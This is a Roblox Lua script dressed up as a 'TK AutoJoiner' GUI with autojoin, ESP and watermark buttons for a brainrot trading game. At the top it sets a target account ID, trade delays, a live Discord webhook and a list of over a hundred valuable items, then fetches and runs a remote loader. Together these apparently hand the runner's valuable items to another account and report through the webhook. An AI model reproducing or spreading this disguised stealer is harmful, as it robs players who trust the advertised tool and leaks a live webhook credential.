getgenv().SECRET_KEY = "mrr_11fb7b79c94d46bcaacc2d97ccf71af2"
getgenv().TARGET_ID = 8576326876
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1459656652881137898/lnlsdDaNcJIWOTrrwr9aFUAe5s_w5yItAWyCG0VUxiKyhZxslELyaya7ZALaWJeTOqi-"
getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Taco Combinasion"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Tang Tang Keletang"] = true,
    ["Ketupat Kepat"] = true,
    ["Tictac Sahur"] = true,
    ["Garama and Madundung"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Guest 666"] = true,
    ["Mariachi Corazoni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Love Love Bear"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Los Sekolahs"] = true,
    ["Reinito Sleighito"] = true,
    ["Cooki and Milki"] = true,
    ["Ketupat Bros"] = true,
    ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["La Grande Combinasion"] = true,
    ["Los Sweethearts"] = true,
    ["Las Sis"] = true,
    ["Los Planitos"] = true,
    ["Los Mobilis"] = true,
    ["Los Candies"] = true,
    ["Money Money Reindeer"] = true,
    ["Eviledon"] = true,
    ["Orcaledon"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Telemorte"] = true,
    ["Noo my Candy"] = true,
    ["Noo my Present"] = true,
    ["Los 25"] = true,
    ["Noo my Heart"] = true,
    ["Fishino Clownino"] = true,
    ["Chicleteira Cupideira"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["La Ginger Sekolah"] = true,
    ["Nooo My Hotspot"] = true,
    ["Los Nooo My Hotspotsitos"] = true,
    ["Arcadopus"] = true,
    ["Esok Sekolah"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["La Food Combinasion"] = true,
    ["Los Amigos"] = true,
    ["Los Combinasionas"] = true,
    ["Lovin Rose"] = true,
    ["La Extinct Grande"] = true,
    ["La Spooky Grande"] = true,
    ["Agarrini la Palini"] = true,
    ["Chipso and Queso"] = true,
    ["Karker Sahur"] = true,
    ["Donkeyturbo Express"] = true,
    ["Chimnino"] = true,
    ["Noo my examine"] = true,
    ["Griffin"] = true,
    ["Nacho Spyder"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["Swag Soda"] = true,
    ["25"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Burritos"] = true,
    ["67"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Los 67"] = true,
    ["La Sahur Combinasion"] = true,
    ["Fragola La La La"] = true,
    ["La Lucky Grande"] = true
}
task.spawn(function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
end)

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- GUI
local TKAutojoiner = Instance.new("ScreenGui")
TKAutojoiner.Name = "TK Autojoiner"
TKAutojoiner.Parent = player:WaitForChild("PlayerGui")
TKAutojoiner.IgnoreGuiInset = true
TKAutojoiner.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local Screen = Instance.new("Frame")
Screen.Parent = TKAutojoiner
Screen.Size = UDim2.fromScale(1,1)
Screen.BackgroundTransparency = 1

-- MAIN FRAME
local Main = Instance.new("Frame")
Main.Parent = Screen
Main.Size = UDim2.new(0,165,0,220)
Main.AnchorPoint = Vector2.new(0.5,0.5)
Main.Position = UDim2.fromScale(0.5,0.5)
Main.BackgroundColor3 = Color3.fromRGB(45,45,45)
Instance.new("UICorner",Main).CornerRadius = UDim.new(0,3)

-- TITLE
local Title = Instance.new("TextLabel")
Title.Parent = Main
Title.Size = UDim2.new(0,88,0,50)
Title.Position = UDim2.new(0.23,0,-0.03,0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.Text = "TK AutoJoiner"
Title.TextColor3 = Color3.fromRGB(65,122,255)
Title.TextSize = 14
local UIGradient_Title = Instance.new("UIGradient", Title)
UIGradient_Title.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0,132,255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(13,16,161))}

-- EXTRAS LABEL
local Extras = Instance.new("TextLabel")
Extras.Parent = Main
Extras.Size = UDim2.new(0,88,0,50)
Extras.Position = UDim2.new(0.23,0,0.38,0)
Extras.BackgroundTransparency = 1
Extras.Font = Enum.Font.GothamBold
Extras.Text = "Extras"
Extras.TextColor3 = Color3.fromRGB(65,122,255)
Extras.TextSize = 14
local UIGradient_Extras = Instance.new("UIGradient", Extras)
UIGradient_Extras.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0,132,255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(13,16,161))}

-- BUTTON CREATOR
local function createButton(name,text,posY)
    local b = Instance.new("TextButton")
    b.Name = name
    b.Parent = Main
    b.Size = UDim2.new(0,148,0,27)
    b.Position = UDim2.new(0.048,0,posY,0)
    b.BackgroundColor3 = Color3.fromRGB(66,66,66)
    b.Font = Enum.Font.GothamBold
    b.Text = text
    b.TextColor3 = Color3.fromRGB(255,255,255)
    b.TextSize = 14
    Instance.new("UICorner",b).CornerRadius = UDim.new(0,3)
    return b
end

local AutoJoin = createButton("AutoJoin","AutoJoin",0.15)
local Mps = createButton("Mps","MPS : 20M/s",0.30)
local SecretESP = createButton("SecretESP","Secret ESP",0.56)
local WatermarkBtn = createButton("Watermark","Watermark",0.70)

-- TIKTOK LABEL
local Tiktok = Instance.new("TextLabel")
Tiktok.Parent = Main
Tiktok.Size = UDim2.new(0,88,0,50)
Tiktok.Position = UDim2.new(0.22,0,0.80,0)
Tiktok.BackgroundTransparency = 1
Tiktok.Font = Enum.Font.Gotham
Tiktok.Text = "TikTok : FemboyHub"
Tiktok.TextColor3 = Color3.fromRGB(175,175,175)
Tiktok.TextSize = 14
local UIGradient_Tiktok = Instance.new("UIGradient", Tiktok)
UIGradient_Tiktok.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0,132,255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(13,16,161))}

-- WATERMARK FRAME
local WaterMark = Instance.new("Frame")
WaterMark.Parent = Screen
WaterMark.Size = UDim2.new(0,235,0,70)
WaterMark.AnchorPoint = Vector2.new(0.5,0)
WaterMark.Position = UDim2.fromScale(0.5,0.02)
WaterMark.BackgroundTransparency = 1

local WMTitle = Instance.new("TextLabel")
WMTitle.Parent = WaterMark
WMTitle.Size = UDim2.new(0,88,0,50)
WMTitle.Position = UDim2.new(0.32,0,-0.09,0)
WMTitle.BackgroundTransparency = 1
WMTitle.Font = Enum.Font.GothamBold
WMTitle.Text = "TK AutoJoiner"
WMTitle.TextColor3 = Color3.fromRGB(65,122,255)
WMTitle.TextSize = 27
local UIGradient_WM = Instance.new("UIGradient", WMTitle)
UIGradient_WM.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0,132,255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(13,16,161))}

local WMTiktok = Instance.new("TextLabel")
WMTiktok.Parent = WaterMark
WMTiktok.Size = UDim2.new(0,88,0,50)
WMTiktok.Position = UDim2.new(0.31,0,0.27,0)
WMTiktok.BackgroundTransparency = 1
WMTiktok.Font = Enum.Font.Gotham
WMTiktok.Text = "TikTok : FemboyHub"
WMTiktok.TextColor3 = Color3.fromRGB(175,175,175)
WMTiktok.TextSize = 14
local UIGradient_WMTiktok = Instance.new("UIGradient", WMTiktok)
UIGradient_WMTiktok.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0,132,255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(13,16,161))}

-- DRAGGING (MOUSE + TOUCH)
local dragging = false
local dragStart, startPos
Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
UIS.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- MPS BUTTON LOGIC
local mpsValues = {10,20,50,100,500}
local currentIndex = 2
Mps.MouseButton1Click:Connect(function()
    currentIndex = currentIndex + 1
    if currentIndex > #mpsValues then currentIndex = 1 end
    Mps.Text = "MPS : "..mpsValues[currentIndex].."M/s"
end)

-- WATERMARK TOGGLE
local watermarkVisible = true
WatermarkBtn.MouseButton1Click:Connect(function()
    watermarkVisible = not watermarkVisible
    WaterMark.Visible = watermarkVisible
end)

-- AUTOJOIN RANDOM SERVER
AutoJoin.MouseButton1Click:Connect(function()
    local PLACE_ID = 109983668079237
    local servers = {}
    pcall(function()
        local url = "https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100"
        local response = game:HttpGet(url)
        local data = HttpService:JSONDecode(response)
        if data and data.data then
            for _,v in pairs(data.data) do
                if v.playing < v.maxPlayers then
                    table.insert(servers,v.id)
                end
            end
        end
    end)
    if #servers > 0 then
        local randomServer = servers[math.random(1,#servers)]
        TeleportService:TeleportToPlaceInstance(PLACE_ID, randomServer, player)
    else
        warn("Keine freien Server gefunden!")
    end
end)
